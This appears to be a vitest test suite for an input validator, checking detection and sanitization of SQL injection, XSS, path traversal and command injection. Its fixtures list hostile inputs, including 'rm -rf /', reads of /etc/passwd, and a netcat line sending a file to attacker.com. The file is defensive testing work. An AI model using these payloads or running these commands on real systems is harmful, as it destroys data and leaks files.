/**
 * Input Validation System Tests
 * 
 * Comprehensive test suite for the input validation and sanitization system.
 * Tests all validation rules, sanitization policies, and security controls.
 * 
 * Test Coverage:
 * - SQL injection prevention  
 * - XSS attack mitigation
 * - Path traversal protection
 * - Command injection prevention
 * - Data type validation
 * - Custom validation rules
 * - Sanitization policies
 * - Error handling
 * - Performance requirements
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { 
  ComprehensiveInputValidator, 
  DEFAULT_INPUT_VALIDATION_CONFIG,
  InputValidationUtils 
} from '../../../packages/ast-helper/src/security/input-validator.js';
import type { 
  InputValidationConfig, 
  ValidationRule, 
  SanitizationRule,
  ValidationContext,
  SanitizationContext
} from '../../../packages/ast-helper/src/security/types.js';

describe('Input Validation System', () => {
  let validator: ComprehensiveInputValidator;

  beforeEach(() => {
    validator = new ComprehensiveInputValidator();
  });

  describe('Core Input Validator', () => {
    describe('Initialization', () => {
      it('should initialize successfully with default configuration', () => {
        expect(validator).toBeDefined();
        expect(validator.getValidationStats()).toEqual({
          totalValidations: 0,
          validInputs: 0,
          invalidInputs: 0,
          sanitizations: 0,
          blockedInputs: 0
        });
      });

      it('should initialize with custom configuration', () => {
        const customConfig: Partial<InputValidationConfig> = {
          sqlInjection: {
            enabled: false,
            strictMode: false,
            blockedPatterns: [],
            allowedCharacters: /^.*$/,
            maxLength: 5000
          },
          general: {
            caseSensitive: true,
            trimWhitespace: false,
            normalizeUnicode: false,
            maxInputSize: 100000,
            enableLogging: false,
            logLevel: 'error'
          }
        };

        const customValidator = new ComprehensiveInputValidator(customConfig);
        expect(customValidator).toBeDefined();
      });
    });

    describe('SQL Injection Prevention', () => {
      it('should detect SQL injection patterns', async () => {
        const maliciousInputs = [
          "'; DROP TABLE users; --",
          "1' OR '1'='1",
          "admin'--",
          "UNION SELECT * FROM passwords",
          "1; DELETE FROM accounts WHERE 1=1",
          "' OR 1=1 #"
        ];

        for (const input of maliciousInputs) {
          const result = await validator.validateInput(input);
          expect(result.isValid).toBe(false);
          expect(result.message).toContain('SQL injection');
        }
      });

      it('should allow safe SQL inputs', async () => {
        const safeInputs = [
          "John Smith",
          "user@example.com",
          "Valid search term",
          "Product123",
          "2023-12-01"
        ];

        for (const input of safeInputs) {
          const result = await validator.validateInput(input);
          expect(result.isValid).toBe(true);
        }
      });

      it('should sanitize SQL injection attempts', async () => {
        const maliciousInput = "admin'; DROP TABLE users; --";
        const result = await validator.sanitizeInput(maliciousInput);
        
        expect(result.wasModified).toBe(true);
        expect(result.sanitizedInput).not.toContain("DROP TABLE");
        expect(result.message).toContain('SQL patterns sanitized');
      });
    });

    describe('XSS Protection', () => {
      it('should detect XSS attack patterns', async () => {
        const xssInputs = [
          "<script>alert('XSS')</script>",
          "<img src='x' onerror='alert(1)'>",
          "javascript:alert('XSS')",
          "<iframe src='javascript:alert(1)'></iframe>",
          "<body onload='alert(1)'>",
          "onclick='malicious()'"
        ];

        for (const input of xssInputs) {
          const result = await validator.validateInput(input);
          expect(result.isValid).toBe(false);
          expect(result.message).toContain('XSS');
        }
      });

      it('should allow safe HTML content', async () => {
        const safeInputs = [
          "<p>Safe paragraph text</p>",
          "<strong>Bold text</strong>",
          "<em>Emphasized text</em>",
          "<h1>Heading text</h1>",
          "Plain text content"
        ];

        for (const input of safeInputs) {
          const result = await validator.validateInput(input);
          expect(result.isValid).toBe(true);
        }
      });

      it('should sanitize XSS attempts', async () => {
        const xssInput = "<script>alert('XSS')</script><p>Safe content</p>";
        const result = await validator.sanitizeInput(xssInput);
        
        expect(result.wasModified).toBe(true);
        expect(result.sanitizedInput).not.toContain("<script>");
        expect(result.sanitizedInput).toContain("Safe content");
      });

      it('should HTML encode output when configured', async () => {
        const input = "<div>Test & content</div>";
        const result = await validator.sanitizeInput(input);
        
        expect(result.sanitizedInput).toContain("&lt;");
        expect(result.sanitizedInput).toContain("&gt;");
        expect(result.sanitizedInput).toContain("&amp;");
      });
    });

    describe('Path Traversal Protection', () => {
      it('should detect path traversal attempts', async () => {
        const traversalInputs = [
          "../../../etc/passwd",
          "..\\windows\\system32",
          "/var/log/../../../etc/shadow",
          "%2e%2e%2fpasswd",
          "....//etc/passwd"
        ];

        for (const input of traversalInputs) {
          const context: ValidationContext = { inputType: 'path' };
          const result = await validator.validateInput(input, context);
          expect(result.isValid).toBe(false);
          expect(result.message).toContain('Path traversal');
        }
      });

      it('should allow safe file paths', async () => {
        const safeInputs = [
          "documents/file.txt",
          "images/photo.jpg",
          "data/report.pdf",
          "uploads/document.docx"
        ];

        for (const input of safeInputs) {
          const context: ValidationContext = { inputType: 'path' };
          const result = await validator.validateInput(input, context);
          expect(result.isValid).toBe(true);
        }
      });

      it('should sanitize path traversal attempts', async () => {
        const traversalInput = "../../../etc/passwd";
        const context: SanitizationContext = { inputType: 'path' };
        const result = await validator.sanitizeInput(traversalInput, context);
        
        expect(result.wasModified).toBe(true);
        expect(result.sanitizedInput).not.toContain("..");
        expect(result.message).toContain('Path traversal patterns removed');
      });
    });

    describe('Command Injection Prevention', () => {
      it('should detect command injection patterns', async () => {
        const cmdInputs = [
          "ls; rm -rf /",
          "cat file.txt | nc attacker.com 1234",
          "$(malicious_command)",
          "; shutdown -h now",
          "&& format c:",
          "`rm -rf /home`"
        ];

        for (const input of cmdInputs) {
          const context: ValidationContext = { inputType: 'command' };
          const result = await validator.validateInput(input, context);
          expect(result.isValid).toBe(false);
          expect(result.message).toContain('Command injection');
        }
      });

      it('should allow safe commands', async () => {
        const safeInputs = [
          "ls -la documents",
          "cat readme.txt",
          "grep pattern file.txt",
          "find . -name '*.js'"
        ];

        for (const input of safeInputs) {
          const context: ValidationContext = { inputType: 'command' };
          const result = await validator.validateInput(input, context);
          expect(result.isValid).toBe(true);
        }
      });
    });

    describe('Data Type Validation', () => {
      it('should validate string inputs', async () => {
        const validString = "Valid text content";
        const result = await validator.validateInput(validString);
        expect(result.isValid).toBe(true);

        const longString = "x".repeat(10001); // Exceeds default max
        const longResult = await validator.validateInput(longString);
        expect(longResult.isValid).toBe(false);
        expect(longResult.message).toContain('String exceeds maximum length');
      });

      it('should validate number inputs', async () => {
        const validNumber = 12345;
        const result = await validator.validateInput(validNumber);
        expect(result.isValid).toBe(true);

        const invalidNumber = Number.MAX_SAFE_INTEGER + 1;
        const numberResult = await validator.validateInput(invalidNumber);
        expect(numberResult.isValid).toBe(false);
      });

      it('should validate array inputs', async () => {
        const validArray = [1, 2, 3, 4, 5];
        const result = await validator.validateInput(validArray);
        expect(result.isValid).toBe(true);

        const longArray = new Array(1001); // Exceeds default max
        const arrayResult = await validator.validateInput(longArray);
        expect(arrayResult.isValid).toBe(false);
        expect(arrayResult.message).toContain('Array exceeds maximum length');
      });

      it('should validate object depth', async () => {
        const shallowObject = { a: { b: { c: "value" } } };
        const result = await validator.validateInput(shallowObject);
        expect(result.isValid).toBe(true);

        // Create deeply nested object
        const deepObject: any = {};
        let current = deepObject;
        for (let i = 0; i < 15; i++) { // Exceeds default max depth of 10
          current.next = {};
          current = current.next;
        }

        const deepResult = await validator.validateInput(deepObject);
        expect(deepResult.isValid).toBe(false);
        expect(deepResult.message).toContain('Object exceeds maximum depth');
      });
    });

    describe('Custom Validation Rules', () => {
      it('should allow adding custom validation rules', async () => {
        const customRule: ValidationRule = {
          id: 'email-validation',
          name: 'Email Validation',
          description: 'Validates email format',
          enabled: true,
          validate: async (input: unknown) => {
            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            const isValid = typeof input === 'string' && emailPattern.test(input);
            return { isValid, message: isValid ? 'Valid email' : 'Invalid email format' };
          }
        };

        validator.addValidationRule(customRule);

        const validEmail = "user@example.com";
        const invalidEmail = "invalid-email";

        const validResult = await validator.validateInput(validEmail);
        const invalidResult = await validator.validateInput(invalidEmail);

        expect(validResult.isValid).toBe(true);
        expect(invalidResult.isValid).toBe(false);
        expect(invalidResult.message).toContain('email-validation');
      });

      it('should allow adding custom sanitization rules', async () => {
        const customRule: SanitizationRule = {
          id: 'phone-formatting',
          name: 'Phone Number Formatting',
          description: 'Formats phone numbers consistently',
          enabled: true,
          sanitize: async (input: unknown) => {
            const phone = String(input).replace(/\D/g, ''); // Remove non-digits
            if (phone.length === 10) {
              return `(${phone.slice(0, 3)}) ${phone.slice(3, 6)}-${phone.slice(6)}`;
            }
            return String(input);
          }
        };

        validator.addSanitizationRule(customRule);

        const rawPhone = "1234567890";
        const result = await validator.sanitizeInput(rawPhone);

        expect(result.wasModified).toBe(true);
        expect(result.sanitizedInput).toBe("(123) 456-7890");
      });
    });

    describe('Combined Validation and Sanitization', () => {
      it('should validate and sanitize input in one operation', async () => {
        const input = "<script>alert('test')</script>Valid content";
        const result = await validator.validateAndSanitize(input);

        expect(result.validation.isValid).toBe(false); // XSS detected
        expect(result.sanitization.wasModified).toBe(true); // Script removed
        expect(result.sanitization.sanitizedInput).not.toContain("<script>");
        expect(result.sanitization.sanitizedInput).toContain("Valid content");
      });
    });

    describe('Error Handling', () => {
      it('should handle null and undefined inputs gracefully', async () => {
        const nullResult = await validator.validateInput(null);
        const undefinedResult = await validator.validateInput(undefined);

        expect(nullResult.isValid).toBe(true);
        expect(nullResult.message).toContain('empty');
        expect(undefinedResult.isValid).toBe(true);
        expect(undefinedResult.message).toContain('empty');
      });

      it('should handle validation errors gracefully', async () => {
        // Mock a rule that throws an error
        const errorRule: ValidationRule = {
          id: 'error-rule',
          name: 'Error Rule',
          description: 'Rule that throws errors',
          enabled: true,
          validate: async () => {
            throw new Error('Test error');
          }
        };

        validator.addValidationRule(errorRule);

        const result = await validator.validateInput("test");
        expect(result.isValid).toBe(false);
        expect(result.message).toContain('Validation error');
      });

      it('should handle oversized inputs', async () => {
        const oversizedInput = "x".repeat(50001); // Exceeds default max size
        const result = await validator.validateInput(oversizedInput);

        expect(result.isValid).toBe(false);
        expect(result.message).toContain('exceeds maximum size');
      });
    });

    describe('Performance Requirements', () => {
      it('should validate inputs within reasonable time', async () => {
        const startTime = Date.now();
        
        const input = "Test input for performance validation";
        await validator.validateInput(input);
        
        const endTime = Date.now();
        const duration = endTime - startTime;
        
        expect(duration).toBeLessThan(100); // Should complete within 100ms
      });

      it('should handle batch validations efficiently', async () => {
        const inputs = Array(100).fill(0).map((_, i) => `Test input ${i}`);
        const startTime = Date.now();
        
        const promises = inputs.map(input => validator.validateInput(input));
        await Promise.all(promises);
        
        const endTime = Date.now();
        const duration = endTime - startTime;
        
        expect(duration).toBeLessThan(1000); // Should complete within 1 second
      });
    });

    describe('Validation Statistics', () => {
      it('should track validation statistics accurately', async () => {
        await validator.validateInput("valid input");
        await validator.validateInput("'; DROP TABLE users; --");
        await validator.sanitizeInput("test input");

        const stats = validator.getValidationStats();
        
        expect(stats.totalValidations).toBe(2);
        expect(stats.validInputs).toBe(1);
        expect(stats.invalidInputs).toBe(1);
        expect(stats.sanitizations).toBe(1);
      });

      it('should reset statistics correctly', () => {
        // Note: This would require implementing a reset method
        // For now, we'll just verify the structure
        const stats = validator.getValidationStats();
        
        expect(stats).toHaveProperty('totalValidations');
        expect(stats).toHaveProperty('validInputs');
        expect(stats).toHaveProperty('invalidInputs');
        expect(stats).toHaveProperty('sanitizations');
        expect(stats).toHaveProperty('blockedInputs');
      });
    });
  });

  describe('Input Validation Configuration', () => {
    it('should use default configuration correctly', () => {
      expect(DEFAULT_INPUT_VALIDATION_CONFIG).toBeDefined();
      expect(DEFAULT_INPUT_VALIDATION_CONFIG.sqlInjection.enabled).toBe(true);
      expect(DEFAULT_INPUT_VALIDATION_CONFIG.xssProtection.enabled).toBe(true);
      expect(DEFAULT_INPUT_VALIDATION_CONFIG.pathTraversal.enabled).toBe(true);
      expect(DEFAULT_INPUT_VALIDATION_CONFIG.commandInjection.enabled).toBe(true);
      expect(DEFAULT_INPUT_VALIDATION_CONFIG.dataTypes.enabled).toBe(true);
    });

    it('should validate configuration structure', () => {
      const config = DEFAULT_INPUT_VALIDATION_CONFIG;

      // SQL injection configuration
      expect(config.sqlInjection).toHaveProperty('blockedPatterns');
      expect(config.sqlInjection).toHaveProperty('allowedCharacters');
      expect(config.sqlInjection).toHaveProperty('maxLength');

      // XSS protection configuration
      expect(config.xssProtection).toHaveProperty('blockedTags');
      expect(config.xssProtection).toHaveProperty('blockedAttributes');
      expect(config.xssProtection).toHaveProperty('allowedTags');

      // Path traversal configuration
      expect(config.pathTraversal).toHaveProperty('blockedPatterns');
      expect(config.pathTraversal).toHaveProperty('maxPathLength');

      // Command injection configuration
      expect(config.commandInjection).toHaveProperty('blockedCommands');
      expect(config.commandInjection).toHaveProperty('blockedPatterns');
    });
  });

  describe('Input Validation Utilities', () => {
    describe('Quick Validation', () => {
      it('should validate email addresses', async () => {
        expect(await InputValidationUtils.quickValidate('user@example.com', 'email')).toBe(true);
        expect(await InputValidationUtils.quickValidate('invalid-email', 'email')).toBe(false);
      });

      it('should validate URLs', async () => {
        expect(await InputValidationUtils.quickValidate('https://example.com', 'url')).toBe(true);
        expect(await InputValidationUtils.quickValidate('not-a-url', 'url')).toBe(false);
      });

      it('should validate phone numbers', async () => {
        expect(await InputValidationUtils.quickValidate('+1 234 567 8900', 'phone')).toBe(true);
        expect(await InputValidationUtils.quickValidate('invalid-phone', 'phone')).toBe(false);
      });

      it('should validate IP addresses', async () => {
        expect(await InputValidationUtils.quickValidate('192.168.1.1', 'ip')).toBe(true);
        expect(await InputValidationUtils.quickValidate('999.999.999.999', 'ip')).toBe(false);
      });

      it('should validate UUIDs', async () => {
        expect(await InputValidationUtils.quickValidate('550e8400-e29b-41d4-a716-446655440000', 'uuid')).toBe(true);
        expect(await InputValidationUtils.quickValidate('not-a-uuid', 'uuid')).toBe(false);
      });
    });

    describe('Validation Reporting', () => {
      it('should generate validation reports', async () => {
        const results = [
          { isValid: true, message: 'Valid', violations: [], timestamp: '2023-01-01', context: {} },
          { isValid: false, message: 'Invalid', violations: ['SQL injection'], timestamp: '2023-01-01', context: {} },
          { isValid: false, message: 'Invalid', violations: ['XSS', 'SQL injection'], timestamp: '2023-01-01', context: {} }
        ];

        const report = InputValidationUtils.generateValidationReport(results);

        expect(report.totalChecks).toBe(3);
        expect(report.validInputs).toBe(1);
        expect(report.invalidInputs).toBe(2);
        expect(report.validationRate).toBe(33.33333333333333);
        expect(report.commonViolations).toContain('SQL injection');
      });
    });

    describe('Validation Middleware', () => {
      it('should create Express.js middleware', () => {
        const middleware = InputValidationUtils.createValidationMiddleware(validator);
        
        expect(middleware).toHaveProperty('express');
        expect(typeof middleware.express).toBe('function');
      });
    });
  });

  describe('Integration Requirements', () => {
    it('should integrate with existing security architecture', async () => {
      // Verify that the validator can be used with other security components
      const validator = new ComprehensiveInputValidator();
      
      expect(validator).toBeDefined();
      expect(typeof validator.validateInput).toBe('function');
      expect(typeof validator.sanitizeInput).toBe('function');
      expect(typeof validator.validateAndSanitize).toBe('function');
    });

    it('should support framework integration patterns', () => {
      // Test that the validator can be wrapped for different frameworks
      const middleware = InputValidationUtils.createValidationMiddleware(validator);
      
      expect(middleware.express).toBeDefined();
      // Additional framework middleware could be tested here
    });

    it('should maintain backwards compatibility', () => {
      // Ensure the interface remains stable
      const validator = new ComprehensiveInputValidator();
      
      expect(validator.getValidationStats).toBeDefined();
      expect(validator.addValidationRule).toBeDefined();
      expect(validator.addSanitizationRule).toBeDefined();
    });
  });
});